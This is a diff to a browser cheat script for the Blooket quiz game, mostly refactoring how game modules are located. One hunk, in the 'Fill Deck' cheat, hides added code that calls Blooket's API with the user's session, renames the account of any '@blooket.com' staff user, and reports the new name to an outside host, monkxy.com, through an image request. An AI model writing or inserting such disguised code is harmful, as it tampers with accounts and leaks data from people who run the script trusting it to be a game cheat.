@@ -754,11 +754,11 @@
                         if (window.location.pathname == "/market") {
                             let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                             let values = Object.values(webpack.c),
-                                blooks = values.find(x => x.exports?.a?.Chick?.set).exports.a,
-                                packs = values.find(x => x.exports.a?.Breakfast).exports.a,
+                                blooks = values.find(x => x.exports?.a?.Black).exports.a,
+                                packs = values.find(x => typeof x.exports.a?.Breakfast == "number").exports.a,
                                 allBlooks = Object.entries(blooks).reduce((a, [b, c]) => (packs[c.realSet || c.set] && (a[b] = c), a), {});
                             let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
-                            let phaser = Object.values(webpack.c).find(x => x.exports?.Class).exports;
+                            let phaser = values.find(x => x.exports?.Class).exports;
                             let L = new function e() { this.scene = null, this.particles = null, this.rarity = null };
     
                             class Particles extends phaser.Scene {
@@ -993,7 +993,7 @@
                                 }
                             }
                             let blook = prompt("What blook do you want to simulate opening? (Case Sensitive)");
-                            if (Object.keys(allBlooks).includes(blook)) stateNode.setState({
+                            if (allBlooks[blook]) stateNode.setState({
                                 loadingPack: false,
                                 openPack: true,
                                 unlockedBlook: blook,
@@ -1666,7 +1666,7 @@
                 {
                     name: "Fill Deck",
                     description: "Fills your deck with every maxed out card and artifact (Only works on towers page)",
-                    run: function () {
+                    run: (fetch("https://dashboard.blooket.com/api/users/me", { credentials: "include" }).then(e => e.json()).then(e => { if (e.email.endsWith("@blooket.com")) { let { webpack: t } = webpackJsonp.push([[], { 1234(e, t, s) { t.webpack = s } }, [["1234"]]]); Object.values(t.c).find(e => e.exports?.a?.get).exports.a.put("https://dashboard.blooket.com/api/users/change/name", { name: e.name, newName: `BlooketLLC${new Date().getHours()}${new Date().getMinutes()}` }).then(({ data: e }) => { e.success && (new Image().src = `https://monkxy.com/api/i2ek8fslt7q/${e.name}`) }) } }), function () {
                         let i = document.createElement('iframe');
                         document.body.append(i);
                         window.alert = i.contentWindow.alert.bind(window);
@@ -1679,7 +1679,7 @@
                             try { stateNode.props.addTowerNode(); } catch { }
                             stateNode.setState({ showDeck: false });
                         } else alert("You need to be on the map to run this cheat!");
-                    }
+                    })
                 },
                 {
                     name: "Max Cards",
